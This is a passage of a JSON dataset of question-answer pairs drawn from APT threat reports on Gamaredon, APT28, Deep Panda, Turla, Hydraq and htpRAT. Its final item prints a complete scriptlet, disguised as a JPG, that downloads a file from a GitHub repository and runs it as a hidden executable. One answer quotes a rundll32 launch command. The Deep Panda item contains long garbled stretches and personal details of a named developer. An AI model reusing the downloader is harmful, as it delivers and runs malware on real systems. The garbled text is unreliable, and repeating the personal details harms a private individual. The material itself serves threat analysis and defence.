them. They can be the work of hacktivists, patriotic hacking groups, or to further complicate things, enemy nations using the name of supposed culprits to carry out attacks. Welcome to the wonderfully complex world of geopolitical malware!\nThis research paper tells the story of a highly targeted attack campaign that raised all kinds of red flags. What we have dubbed \"Operation Arid Viper\" refers to a campaign that exclusively targets victims in Israel. This particular case showed that not only countries are looking at Israel through the crosshairs; a few organizations who consider themselves the country's adversaries are, too. As such, we cannot discount that this attack could have been made by a rogue organization that is trying to shake the chessboard of world politics.\nOperation Arid Viper uses malware delivered via phishing emails to steal documents from target systems. This paper\u2014a collaborative effort of the Trend Micro Forward-Looking Threat Research Team and fellow threat defense experts\u2014reveals the campaign's technical details and its targets as well as details on a number of individuals who appear to be tied to the campaign. Special thanks also goes out to the United States Air Force (USAF) Office of Special Investigations for their assistance and partnership in this endeavor.\n\nWhat are the key characteristics of the targets of state-sponsored malware, and how do these characteristics help in identifying the motivations behind the attacks? Provide examples from the Operation Arid Viper report.",
    "output": "A: State-sponsored malware often targets specific groups, regions, or vertical industries, which is a telltale sign that the attackers have political or strategic interests beyond mere financial gain. In the case of Operation Arid Viper, the campaign exclusively targeted victims in Israel, suggesting that the attackers had a specific agenda related to geopolitical tensions. The targets included an Israeli government research facility, indicating that the attackers were interested in sensitive information that could be used for espionage or to disrupt Israeli operations. Additionally, the report mentions that not all politically motivated attacks are carried out by governments; they can also be the work of hacktivists or patriotic hacking groups. Understanding the targets helps in identifying the motivations behind the attacks, whether they are state-sponsored espionage, hacktivism, or other forms of politically motivated cyber activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ATTRIBUTION\nAttribution in the cyber domain is always a tricky subject when relying solely on malicious samples. Compiler artifacts and language settings can of course be deliberately masked or spoofed.  CrowdStrike uses a unique approach of comprehensive threat analysis in order to decipher attributable components.  Based on the corroborating evidence discovered in the course of this analysis, it appears there are numerous indications that this is a Chinese-speaking actor.\n=KX'RQJ)DQJ<X\ue011H[H\ue003LV\ue003D\ue003FRPSRQHQW\ue003RI\ue003\ue016\ue019\ue013\ue003\ue016\ue019\ue013 , a Chinese security product available from http://www.360.cn/. This is particularly relevant in this case because the backdoor DLL sample with an MD5 RI\ue003GH\ue01a\ue018\ue013\ue013IF\ue014\ue013\ue019\ue018D\ue013\ue01b\ue014\ue014\ue01b\ue013\ue01b\ue017\ue014I\ue016\ue015I\ue013\ue019D\ue018\ue016\ue01a\ue003VSHFL\u00bfFDOO\\\ue003DYRLGV\ue003LQVWDOOLQJ\ue003WKH\ue003NHUQHO\ue003GULYHU\ue003RQ\ue003D\ue003V\\VWHP\ue003UXQQLQJ\ue003 this tool.  Speculatively this may be because this security product detects this rootkit, or the author was attempting to prevent accidental infection on systems running this Anti-Virus product.\nThe obfuscation of the KdDisableDebugger() function call is seen on several  Chinese language forums, and can be seen being reused in several code samples on those forums.  As previously mentioned there is no advantage associated with using this call obfuscation, and appears to be reused for no apparent reason other than the attackers have copied code directly from forum code.\nWhile the various network hooking techniques used in the kernel driver may appear novel or well UHVHDUFKHG\ue00f\ue003XSRQ\ue003FORVH\ue003LQVSHFWLRQ\ue003LW\ue003LV\ue003DFWXDOO\\\ue003D\ue003OLQH\ue010IRU\ue010OLQH\ue003FRS\\\ue003RI\ue003DQ\ue003H[LVWLQJ\ue003SRVW\ue003IURP\ue003WKH\ue003QRZ\ue010RI\u00c0LQH\ue003 'rootkit.com' by a Chinese language developer. This post is currently mirrored on dozens of Chinese hacking websites.\nSimilarly the system call hooking is less impressive after searching for \"IoAllocateMdl\" and \"cr0\" (bbs.pediy. com/showthread.php?t=77467 \ue00c\ue003ZKLFK\ue003LGHQWL\u00bfHV\ue003&KLQHVH\ue003IRUXP\ue003ZHEVLWHV\ue003ZLWK\ue003DOPRVW\ue003LGHQWLFDO\ue003FRGH\ue003WR\ue003 perform system call hooking through MDLs. The ldasm inline hooking is also repeated in numerous postings to Chinese forums. One particular website (http://read.pudn.com/downloads197/sourcecode/windows/system/927802/CCRootkit/RootkitSys/HookSSDT.c__.htm) had an almost identical ldasm loop that tried to identify the exact same code sequences.  Open source research of the 4 innocuous kernel APIs \u00b3=Z6DYH.H\\\ue003=Z4XHU\\9DOXH.H\\\ue003=Z(QXPHUDWH9DOXH.H\\\ue003,R$OORFDWH0GO\u00b4\ue00f\ue003LQ\ue003FRQFHUW\ue003OHDGV\ue003GLUHFWO\\\ue003WR\ue003D\ue003 Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs.\nWhile the driver does not use pool tags for most of its allocations, it does utilize them in the networking hooking code, much like the examples found on the Chinese language forums. This sample uses pool tags: 'tnet,' and 'KDTR'. Although the meaning of the KDTR tag is not\n1 http://bbs.pediy.com/showthread.php?t=125358\nhttp://kost0911.pixnet.net/blog/post/36914183-anti-anti-windbg\nREYLRXV\ue00f\ue003ZH\ue003DVVHVV\ue003ZLWK\ue003KLJK\ue003FRQ\u00bfGHQFH\ue003WKDW\ue003WKLV\ue003LV\ue003D\ue003VKRUWHQHG\ue003YHUVLRQ\ue003RI\ue01d\ue003\u00b3.HUQHO\ue003'H7RX5\u00b4\ue00f\ue003ZKLFK\ue003 coincides with the matching functionality of the detour-style inline hook.\nThe driver code (MD5: dae6b9b3b8e39b08b10a51a6457444d8) appears to be a combination of various code that is easily searchable on the Internet, and almost always attributed to Chinese language forums and websites. The system call hooking parts of the code appear to be identical to the HookSSDT.c code authored by Steven Lai 'embedlinux' and utilized in what the author titled 'CC Rootkit' on on August 4, 2008 who's email address is hqulyc@126.com.  This user has a QQ identity of: 5054-3533, QQ is a popular LQVWDQW\ue003PHVVDJLQJ\ue003FKDW\ue003FOLHQW\ue003XVHG\ue003DOPRVW\ue003H[FOXVLYHO\\\ue003LQ\ue003&KLQD\ue011\ue003+LV\ue003UHDO\ue003QDPH\ue003DFFRUGLQJ\ue003WR\ue003KLV\ue00344\ue003SUR\u00bfOH\ue003 (http://user.qzone.qq.com/50543533) appears to be Steven Lai. He was is 28 years old (born September 5, \ue014\ue01c\ue01b\ue016\ue00c\ue003DQG\ue003OLYHV\ue003LQ\ue003;LDPHQ\ue00f\ue003)XMLDQ\ue003SURYLQFH\ue003\ue00b1DQMLQJ\ue0030LOLWDU\\\ue0035HJLRQ\ue00c\ue011\ue003$FFRUGLQJ\ue003WR\ue003KLV\ue003SUR\u00bfOH\ue00f\ue003KH\ue003KDV\ue003ZRUNHG\ue003 at Xiamen XOCECO New Technic Co., Ltd. (http://www.likego.com/en/about.asp), a company that builds DXGLR\ue012YLGHR\ue003V\\VWHPV\ue003IRU\ue003WUDQVSRUWDWLRQ\ue003V\\VWHPV\ue011\ue003\ue0030U\ue011\ue003/DL\ue003LV\ue003QRW\ue003EHLQJ\ue003LGHQWL\u00bfHG\ue003DV\ue003WKH\ue003DFWRU\ue00f\ue003KLV\ue003FRGH\ue003 however was used by whomever built the kernel driver utilized by the backdoor and for this reason we are providing the background on this individual.\n\nWhat are the implications of finding code snippets and techniques used in the Deep Panda APT on Chinese language forums and websites? How does this impact the attribution process?",
    "output": "A: The discovery of code snippets and techniques used in the Deep Panda APT on Chinese language forums and websites has significant implications for the attribution process. It suggests that the attackers may have sourced or shared their code from these forums, indicating a potential link to Chinese-speaking actors. For example, the obfuscation of the KdDisableDebugger() function call and the system call hooking methods are found on Chinese forums. The driver code's similarity to the HookSSDT.c code authored by Steven Lai, a Chinese developer, further supports this attribution. These findings provide corroborating evidence that helps CrowdStrike attribute the APT to a Chinese-speaking actor, even though compiler artifacts and language settings can be masked or spoofed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the sKyWIper malware utilize the System Binary Proxy Execution: Rundll32 technique to execute its malicious code?",
    "output": "System Binary Proxy Execution: Rundll32 is a technique used by adversaries to proxy execution of malicious code by abusing the rundll32.exe process. In the case of the sKyWIper malware, it uses rundll32.exe to execute its malicious code. According to the APT report, the malware can be started using two different methods, one of which involves running the malware from rundll32 using the command 'start /wait rundll32.exe c:\\windows\\system32\\mssecmgr.ocx,DDEnumCallback'. This allows the malware to execute its code without directly running the malicious executable, potentially evading security tools that may not monitor execution of the rundll32.exe process. Furthermore, the malware also uses rundll32.exe to execute other malicious components, such as the 'jimmy.dll' file, which is part of the 'Jimmy' attack. By utilizing the System Binary Proxy Execution: Rundll32 technique, the sKyWIper malware is able to conceal its execution and evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nSince November, geopolitical tensions between Russia and Ukraine have escalated dramatically. It is estimated that Russia has now amassed over 100,000 troops on Ukraine's eastern border, leading some to speculate that an invasion may come next. On Jan. 14, 2022, this conflict spilled over into the cyber domain as the Ukrainian government was targeted with destructive malware ((<https://unit42.paloaltonetworks.com/ukraine-cyber-conflict-cve-2021-32648-whispergate/>)WhisperGate) and a separate vulnerability in OctoberCMS was exploited to deface several Ukrainian government websites. While attribution of those events is ongoing and there is no known link to  (aka Primitive Bear), one of the most active existing advanced persistent threats targeting Ukraine, we anticipate we will see additional malicious cyber activities over the coming weeks as the conflict evolves. We have also observed recent activity from Gamaredon. In light of this, this blog provides an update on the Gamaredon group.\nSince 2013, just prior to Russia's annexation of the Crimean peninsula, the Gamaredon group has primarily focused its cyber campaigns (<https://unit42.paloaltonetworks.com/unit-42-title-gamaredon-group-toolset-evolution/>)against Ukrainian government officials and organizations. In 2017, Unit 42 published its first research documenting Gamaredon's evolving toolkit and naming the group, and over the years, several researchers have noted that the operations and targeting activities of this group align with Russian interests. This link was recently substantiated on Nov. 4, 2021, when the Security Service of Ukraine (SSU) (<https://www.bleepingcomputer.com/news/security/ukraine-links-members-of-gamaredon-hacker-group-to-russian-fsb/>)publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. Concurrently, the SSU also released an updated (<https://ssu.gov.ua/uploads/files/DKIB/Technical%20report%20Armagedon.pdf>)technical report documenting the tools and tradecraft employed by this group.\nGiven the current geopolitical situation and the specific target focus of this APT group, Unit 42 continues to actively monitor for indicators of their operations. In doing so, we have mapped out three large clusters of their infrastructure used to support different phishing and malware purposes. These clusters link to over 700 malicious domains, 215 IP addresses and over 100 samples of malware.\nMonitoring these clusters, we observed an attempt to compromise a Western government entity in Ukraine on Jan. 19, 2022. We have also identified potential malware testing activity and reuse of historical techniques involving open-source virtual network computing (VNC) software. The sections below offer an overview of our findings in order to aid targeted entities in Ukraine as well as cybersecurity organizations in defending against this threat group.\nUpdate Feb. 16: When we originally published this report, we noted, \"While we have mapped out three large clusters of currently active Gamaredon infrastructure, we believe there is more that remains undiscovered.\" We have since discovered hundreds more Gamaredon-related domains, including known related-clusters, and also new clusters. We have updated our (<https://unit42.paloaltonetworks.com/gamaredon-primitive-bear-ukraine-update-2021/#indicators-of-compromise>)Indicators of Compromise (IoCs) to include these additional domains and cluster observations.\nFull visualization of the techniques observed, relevant courses of action and IoCs related to this Gamaredon report can be found in the (<https://unit42.paloaltonetworks.com/atoms/gamaredon/>)Unit 42 ATOM viewer.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products including and the , , (<https://www.paloaltonetworks.com/network-security/advanced-url-filtering>)Advanced URL Filtering and (<https://www.paloaltonetworks.com/network-security/dns-security>)DNS Security subscription services for the .\nRelated Unit 42 Topics ,\nAnswer this question: How has the Gamaredon group evolved its toolkit and targeting activities since its inception in 2013, and how does this evolution align with Russian interests?",
    "output": "The Gamaredon group, also known as Primitive Bear, has been active since 2013 and has primarily targeted Ukrainian government officials and organizations. Over the years, the group has evolved its toolkit, as documented by Unit 42 in 2017. Several researchers have noted that the operations and targeting activities of this group align with Russian interests. This alignment was substantiated on November 4, 2021, when the Security Service of Ukraine (SSU) publicly attributed the leadership of the group to five Russian Federal Security Service (FSB) officers assigned to posts in Crimea. The SSU also released an updated technical report documenting the tools and tradecraft employed by this group. The group's focus on Ukrainian targets and its evolution in tactics, techniques, and procedures (TTPs) demonstrate a strategic alignment with Russian geopolitical objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Hydraq backdoor establish the initial handshake with the server, and what encryption method is used for the SYN-ACK packet?",
    "output": "The Hydraq backdoor establishes the initial handshake by identifying the initial SYN packet sent by the server. If valid, the client responds with a SYN-ACK packet that is 20 bytes in size. The sets of bytes in this packet are encrypted using a bitwise XOR with 0xCC as the key. The expected decrypted values for the SYN-ACK packet are: 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 9. The Russian Federation\nIn this article study several cyber attacks have been attributed to Russia. Regardless of whether the government of Russia is responsible for the attacks, or merely sanctioned them, for many the perception remains that Russia was behind the cyber attacks. I will examine Russia's use of cyber warfare against former Soviet satellite states. (Davis, 2009)\nThe Russian government views itself as the victim in the case of the cyber attacks on Estonia in 2007. According to sources in the Kremlin the website of the President of Russia came under a cyber attack. This was supposedly the largest attack the Russians have faced and it appeared that the servers used to originate the attack were located in the Baltic States. The Deputy Press Secretary of the Russian President, Dmitry Peskov, countered accusations from Estonia with the fact that Russian government websites are under attack every day from all over the world. (The Baltic Times, 2007a)\nEven as cyber attacks occurred against Georgia, Russians said that they were also the victims of cyber attacks. Russia Today, a major media source in Russia, was shut down because of a denial of service attacks directed towards its websites. IT security specialists that work for Russia Today believe that the denial of service attacks originated from Tbilisi, the capital of Georgia. (Watson, 2008)\nIn the aftermath of the cyber attacks on Estonia, Georgia, and other attacks mentioned in this article, the Russian response was to deny any involvement in any cyber attack. When confronted with evidence that some of the attacks originated from Russian government computers members of the Russian government countered with the fact that computers from all over the world were hijacked and used to attack different computer systems. (The Baltic Times, 2007a)\nAnother fact that Russian officials are quick to point out is that the only person arrested for the 2007 cyber attacks on Estonia was an Estonian. Dmitri Galushkevich, a 20 year old ethnic Russian, who was convicted for the cyber attacks. Some members of the Estonian government have issued statements doubting the involvement of the Russian government in the cyber attacks. (Greenberg, 2008)\nWith the finger pointing that ensues after a cyber attack it is still unclear who was behind the attacks. The actions of cyber activist groups, or hactivists, will be examined in the case of the cyber attacks on Estonia and Georgia. Hactivists are individuals that use cyber attacks to take a patriotic or political stand on a political or international issue. (Melikishvili, 2008/2009)\nDuring the protests in Estonia, increased chatter and postings on how to conduct and participate in denial of service attacks were found on Russian internet chat sites (Melikishvili, 2008/2009). Along with the denial of service attacks, some of the Estonian government websites were hacked in order to deface the site. The sayings on the websites were very pro Russian and very anti Estonian. Joshua Davis in Wired Magazine supports the view that the reason behind the attacks was nothing more than Russian pride. (Davis, 2009)\nIn March of 2009 a member of a Russian pro-Kremlin youth group, Konstantin Goloskokov, publicly took responsibility for creating the 2007 cyber attacks on Estonia. Goloskokov is a leader of the youth movement Nashi that has routinely conducted cyber attacks and intimidation campaigns on behalf of the Russian government. The government of the Russian Federation is able to maintain separation from the youth group because it does not directly fund their activities. The youth groups are funded by pro-government business owners who are trying to gain favour from the Russian government (Shachtman, 2009). Goloskokov believes that his actions were not illegal but were, \"an act of civil disobedience organized within the confines of virtual space\" (Buranov, Vodo & Yegikyan, 2009). The cultural aspects or belief that actions in the cyber world are beyond the law is a consequence for the Russian government and how cyber attacks affect their international relationships.\nAn assistant to Sergei Markov, a member of Russia's State Duma lower house, has also admitted to using his own initiative to conduct cyber attacks against Estonia (Baltic News Service, 2009). Rein Lang, the Estonian Justice Minister, is contemplating issuing a European arrest warrant for individuals who have admitted to taking part in the attack. The idea for the warrant is not to send law enforcement officials into Russia, but to have the alleged perpetrators arrested whenever they leave the country (Baltic News Service, 2009). Aleksandr Gostev, director of the Kaspersky Lab's Global Research and Analysis Team, explains that hackers who participate in a distributed denial of service attack violate the Russian Criminal Code (Article 274, Violation of the Rules Governing the Use of Computers, Computer Systems, or Networks Thereof) and can be imprisoned for four years for violating the code. But he also states that the article is rarely used (Buranov, Vodo & Yegikyan, 2009). The examples of Russian citizens admitting to participating in the Estonian cyber attacks are grounds for\nRussian citizens to be arrested in other parts of Europe if Russia fails to uphold its own laws.\nSimilar actions occurred in the Georgian cyber attacks. Messages were posted on Russian hacker forums on how to participate in shutting down Georgian websites. The website StopGeorgia.ru was also established as a private forum to coordinate the denial of service attacks. Jeff Carr, a network security expert and cyber analyst, established an all volunteer group to investigate the cyber attacks. Throughout the course of the investigation, which they named Project Grey Goose, no evidence was found to implicate the Russian government. This was just another example of a hactivist movement which had the collective power to conduct a cyber attack against a government. (Melikishvili, 2008/2009)\nThe Project Grey Goose investigation has looked at hactivists and how they can independently conduct cyber attacks. It also focused on a criminal gang known as the Russian Business Network (R.B.N.). The R.B.N. is based in St. Petersburg and engages in criminal cyber activities. According to Don Jackson, the director of threat intelligence at Secure Works, some of the cyber attacks used against Georgian websites originated from computers under the control of the R.B.N. As is the case with any cyber attacks it is very difficult to establish who is completely responsible or if there is any Russian government sanctioned involvement. (Markoff, 2008a)\nThis article has already noted that there are other groups involved with cyber attacks against former Soviet satellites. The evidence of Russian government involvement will now be investigated (Davis, 2009). Indeed, some statements made by Russian government officials suggest Russian government involvement in cyber attacks. Prior to the cyber attacks in Estonia the Russian government protested the movement of the Russian memorial, the Bronze Soldier, to the Estonian government. The Russian government warned how disastrous the move would be to Estonia. What followed were the protests and the cyber attacks. (Davis, 2009)\nThe head of the Russian Army Centre for Military Forecast, Colonel Anatoly Tsyganok, made comments to the Russian news outlet, Gazeta, about the cyber attacks on Estonia. He believes that there was nothing wrong with the attacks because there are no international agreements established. Colonel Tsyganok also believes that NATO couldn't do\nanything to stop the attacks, and that they were highly successful. (prygi.blogspot.com, 2008)\nThe most telling example of Russian government involvement in cyber warfare was with Herman Simm selling IT secrets to the Russian Foreign Intelligence Service that was discussed earlier in this article. This examples shows that the government of the Russian Federation is actively seeking information on cyber defences and is willing to pay large sums of money (Mr. Simm is accused of selling cyber security secrets for millions of dollars) to receive information on cyber security. (Melikishvili, 2008/2009)\nThere are also cases where cyber attacks were used against people who are in opposition to the Russian government. One such example is with Gary Kasparov, Russian opposition party leader, had his website shut down for two weeks due to denial of service attacks during the Russian presidential campaign. John Palfrey, a researcher at Harvard Law School, believes that several organizations in Russia who plan to protest, or act in opposition to the Russian government, are subjected to cyber attacks in an attempt to control the information that is getting to the public. (Greenberg, 2008)\nAnother example of Russian government complicity is the lack of assistance or interest in tracking down those responsible for the cyber attacks against governments of former Soviet satellites (Davis, 2009). The evidence of government involvement remains circumstantial, but certain facts are clear concerning cyber security and former Soviet satellites. If there is opposition to Russian Federation policy than that country that is in opposition is likely to be subject to a cyber attack and it has been shown that the Russian Federation actively collects information on other countries cyber defences.\nQuestion: How did the Russian government respond to accusations of involvement in the 2007 cyber attacks on Estonia, and what counterarguments did they present?",
    "output": "Answer: The Russian government denied any involvement in the 2007 cyber attacks on Estonia. They countered the accusations by stating that Russian government websites are under attack every day from all over the world. Additionally, they pointed out that the only person arrested for the attacks was an Estonian citizen, Dmitri Galushkevich. Russian officials also argued that computers from various locations were hijacked and used in the attacks, making it difficult to pinpoint the true culprits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Hydraq APT use Search Open Technical Databases: WHOIS to gather information about its targets?",
    "output": "Search Open Technical Databases: WHOIS is a technique used by adversaries to gather information about victims by querying public WHOIS data. In the case of the Hydraq APT, it uses WHOIS data to gather preliminary information about the target organization's infrastructure during the reconnaissance phase. According to the APT report, Hydraq performs reconnaissance with WHOIS, DNS, and IP/Network to learn more about the target. This information is used to identify potential vulnerabilities and plan a successful attack. For example, WHOIS data can reveal information about assigned IP blocks, contact information, and DNS nameservers, which can be used to identify potential entry points for the attack. Furthermore, the report mentions that cyber reconnaissance is used to gather detailed information through social networking sites and tracing digital footprints through search engine results. This suggests that the Hydraq APT uses a combination of WHOIS data and other reconnaissance techniques to gather a comprehensive understanding of its targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Turla APT group use compromised servers in their Neuron and Nautilus malware operations?",
    "output": "The Turla APT group uses compromised servers as a key component in their Neuron and Nautilus malware operations. According to the Compromise Infrastructure: Server description, adversaries may compromise third-party servers to stage, launch, and execute an operation. In the case of Turla's Neuron malware, the Neuron service is typically installed on compromised infrastructure such as mail and web servers, and acts as a Command & Control (C2) server inside the victim network. This allows the actor to evade detection by network gateway-based monitoring and enables client interaction to appear more convincing as the traffic is contained within the target network. Similarly, the Nautilus malware also targets mail servers and uses a compromised server to listen for HTTP requests from clients to process tasking requests. By compromising servers, Turla is able to establish a local C2, reducing the log footprint of actor infrastructure and making it harder to detect their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: SSL Pivot to Additional Infrastructure and Samples\nWhile conducting historical research on the infrastructure in cluster 1, we discovered a self-signed certificate associated with cluster 1 IP address 92.242.62[.]96:\nSerial: 373890427866944398020500009522040110750114845760\nSHA1: 62478d7653e3f5ce79effaf7e69c9cf3c28edf0c\nIssued: 2021-01-27\nExpires: 2031-01-25\nCommon name: ip45-159-200-109.crelcom[.]ru\nAlthough the IP Address WHOIS record for Crelcom LLC is registered to an address in Moscow, the technical admin listed for the netblock containing the IP address is registered to an address in Simferopol, Crimea. We further trace the apparent origins of Crelcom back to Simferopol, Crimea, as well.\nThis certificate relates to 79 IP addresses:\nThe common-name IP address - no Gamaredon domains\nOne IP address links to cluster 1 above (92.242.62[.]96)\n76 IP addresses link to another distinct collection of domains \u2013 \"cluster 2\"\n1 IP address led us to another distinct cluster, \"cluster 3\" (194.67.116[.]67)\nWe find almost no overlap of IP addresses between these separate clusters.\nBig Headline: File Stealer (Cluster 2)\nOf the 76 IP addresses we associate with cluster 2, 70 of them have confirmed links to C2 domains associated with a variant of Gamaredon's file stealer tool. Within the last three months, we have identified 23 samples of this malware, twelve of which appear to have been shared by entities in Ukraine. The C2 domains in those samples include:\nAs you can see, some of these domains were established months ago, yet despite their age, they continue to enjoy benign reputations. For example, only five out of 93 vendors consider the domain krashand[.]ru to be malicious on VirusTotal.\nReviewing passive DNS (pDNS) logs for these domains quickly reveals a long list of subdomains associated with each. Some of the subdomains follow a standardized pattern. For example, several of the domains use the first few letters of the alphabet (a, b, c) in a repeating combination. Conversely, jolotras[.]ru and moolin[.]ru use randomized alphanumeric characters. We believe that these subdomains are dynamically generated by the file stealer when it first establishes a connection with its C2 server. As such, counting the number of subdomains associated with a particular C2 domain provides a rough gauge of the number of entities that have attempted to connect to the server. However, it is important to also note that the number of pDNS entries can also be skewed by researchers and cybersecurity products that may be evaluating the malicious samples associated with a particular C2 domain.\nAnswer this question: How does the use of self-signed certificates by the Gamaredon group contribute to their infrastructure and what insights can be drawn from the certificate details provided?",
    "output": "The use of self-signed certificates by the Gamaredon group contributes to their infrastructure by allowing them to secure communications without relying on third-party certificate authorities, which can help evade detection. The certificate details provided reveal several key insights. First, the certificate's common name, 'ip45-159-200-109.crelcom[.]ru', suggests a link to a specific IP address and domain. Second, the WHOIS record for Crelcom LLC indicates a registration in Moscow but with technical administration in Simferopol, Crimea, suggesting a potential operational base. Third, the certificate relates to 79 IP addresses, with one linking to cluster 1, 76 linking to cluster 2, and one leading to cluster 3. This distribution shows a structured approach to managing different clusters of infrastructure, minimizing overlap and enhancing resilience.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: NATO AND OTHER EUROPEAN SECURITY ORGANIZATIONS\nAPT28's lures and domain registrations also demonstrate their interest in NATO and other European security organizations. NATO remains a chief Russian adversary, or in the words of Russia's 2010 military doctrine, a \"main external military danger\" particularly as it moves \"closer to the borders of the Russian Federation.\"16 As the traditional western counterweight to the Soviet Union, Russia regards NATO, particularly NATO's eastward expansion, as a threat to Russia's strategic stability. APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe (OSCE), an intergovernmental organization that has cited widespread fraud in numerous Russian state\nelections. Insider information about NATO, the OSCE and other security organizations would inform Russian political and military policy.\nSeveral of the domains APT28 registered imitated NATO domain names, including those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition. We also observed a user that we suspect works for NATO HQ submit an APT28 sample to VirusTotal, probably as a result of receiving a suspicious email.\nTable 3: Examples of APT28 domains imitating legitimate NATO and security websites\n16 The Military Doctrine of the Russian Federation, approved by Presidential edict on 5 February 2010.\nAPT28 also demonstrated an interest in defense attaches working in European countries. We identified an APT28 lure containing a decoy document with a list of British officers and U.S. and Canadian military attach\u00e9s in London.\nFinally, APT28 used a lure that contained an apparent non-public listing of contact information for defense attach\u00e9s in the \"Ankara Military Attach\u00e9 Corps (AMAC),\" which appears to be a professional organization of defense attach\u00e9s in Turkey.\nMedium Headline: APT28 Targets European Defense Exhibitions\nIn addition to targeting European security organizations and governments, it appears that APT28 is targeting attendees of European defense exhibitions. Some of the APT28registered domains imitated those of defense events held in Europe, such as the Farnborough Airshow 2014, EuroNaval 2014, EUROSATORY 2014, and the Counter Terror Expo.  In September 2014, APT28 registered a domain (smigroup-online.co[.]uk) that appeared to mimic that for the\nSMi Group, a company that plans events for the \"Defence, Security, Energy, Utilities, Finance and Pharmaceutical sectors.\" Among other events, the SMi Group is currently planning a military satellite communications event for November 2014.\nTargeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies, as well as the victim organizations' operations, communications, and future plans.\n\nWhy did APT28 register domains imitating NATO and other European security organizations? What strategic insights could they gain from such actions?",
    "output": "A: APT28 registered domains imitating NATO and other European security organizations to gather insider information that would inform Russian political and military policy. NATO, being a chief adversary of Russia, is seen as a 'main external military danger,' especially with its eastward expansion. By imitating domains such as those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition, APT28 aimed to collect intelligence that could help Russia understand and counteract NATO's strategies and movements. Similarly, imitating the Organization for Security and Cooperation in Europe (OSCE) allowed APT28 to potentially access information about election monitoring and other security-related activities that Russia considers a threat to its strategic stability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: GitHub repositories for payload delivery\nThe threat actor behind this attack uses GitHub repositories to store second stage payloads. The user account used on GitHub is \"justtest1314\" which holds three repositories, two of which have never been used since they were created. The third repository named \"justme2\" has been actively used to test different variations of transferring a payload from GitHub to a target machine over the course of six to seven months. The account and the initial repository were created on March 30, 2016, with the first commits starting the same day.\nSince the attack on the target in Laos, the attacker decided to clear out the repository. The files were prepped and ready for possible attacks since July 28, three months before the above documented attack. The files were removed on November 18, approximately 10 days after the attack against the Lao organization took place. The actor did not remove the actual repository, but rather cleared out the repository using commits in which the attacker removed the files. This allowed us to get the whole history of all the commits over time as well as every payload (and every version of the payload):\nBased on the Git commit history, we can make a small table showing which file was changed at what time:\nWhile only 20160728.jpg was used in the above mentioned attack, there are many other available payloads. All files besides 2011.jpg are portable executables. 2011.jpg is in fact a scriptlet file containing some VBS scripting to download the 'test.zip' file seen in the above commit log. The scriptlet looks like this (the three versions only had minimal changes, most importantly the Target variable was changed to a random path as to not conflict with already existing files):\n<?XML version=\"1.0\"?>\n<scriptlet>\n<registration     description=\"Com\"     progid=\"Commaster\"     version=\"1.00\"     classid=\"{20001111-0000-0000-0000-0000FEEDACDC}\"\n>\n<script language=\"JScript\">\n<![CDATA[ var Source = \"https://raw.githubusercontent.com/justtest1314/justme2/master/test. zip\"; var Target = \"c:\\\\windows\\\\temp\\\\\"+String(Math.random()*(Math.pow(10,10)))+\".exe\"; var Object = new ActiveXObject('MSXML2.XMLHTTP');\nObject.Open('GET', Source, false);\nObject.Send(); if (Object.Status == 200)\n{\n// Create the Data Stream     var Stream = new ActiveXObject('ADODB.Stream');\n// Establish the Stream\nStream.Open();\nStream.Type = 1; // adTypeBinary\nStream.Write(Object.ResponseBody);\nStream.Position = 0;\nStream.SaveToFile(Target, 2); // adSaveCreateOverWrite\nStream.Close();     new ActiveXObject(\"WScript.Shell\").Run(Target,0,true);\n}\n]]>\n</script>\n</registration>\n<public>\n<method name=\"Exec\"></method>\n</public>\n</scriptlet>\nTest.zip is the first stage payload of htpRAT, similar to the 20160728.jpg file downloaded by the XLS mentioned at the start of this report. The following table lists the files and their respected MD5 and SHA256 values (note, 2011.jpg exists multiple times due to the multiple commits/changes done on this file:\nMedium Headline: Staged delivery of the final htpRAT core\nThe analysis starts from the downloaded payload coming from the 'APA list.xls' file. The payload was downloaded to the application data folder and renamed to 'ctfmon.exe' from the original '20160728.jpg' name (SHA256: 593e13dca3ab6ce6358eec09669f69faef40f1e67069b08e0fe3f8451aaf62ec).\nThe author calls this first package 'Microsoft' based on the project PDB path still left in the binary:\nUpon execution, it first checks if a debugger is active as well as checks if it is able to execute the 'ipconfig' utility, most likely to ensure the next step will succeed. It then proceeds to drop a CAB file named 'temp. cab' in the local temp directory. The CAB file is a compressed bundle containing the third stage of the infection. The code decompresses the CAB file by running the Microsoft 'expand' utility locally. The following three files from the CAB file are placed in the local application data folder in a subfolder called 'Microsoft':\nAfter decompressing the files, the 'winnet.exe' file is executed. This file is a legitimate piece of software; it is a part of the F-Secure antivirus suite and used here because it is vulnerable to DLL side loading. The antivirus component normally loads code from a file called 'fsma32.dll,' which on a normal system is also a component of the antivirus product, but due to the way it searches for this file and performs no verification of its legitimacy, a malicious version of fsma32.dll is started.\nThe author calls this DLL 'windows' based on the project PDB path still present:\nC:\\Users\\cool\\Documents\\Visual Studio 2010\\Projects\\windows\\Release\\windows.pdb\nThe DLL loads the 'data' file, also decompressed from the CAB file, decrypts it and loads the decrypted content into memory and executes it. The decrypted data content is, in fact, also a DLL file, the\nfourthstage of the infection. The author calls this DLL 'dll' based on the project PDB path still present  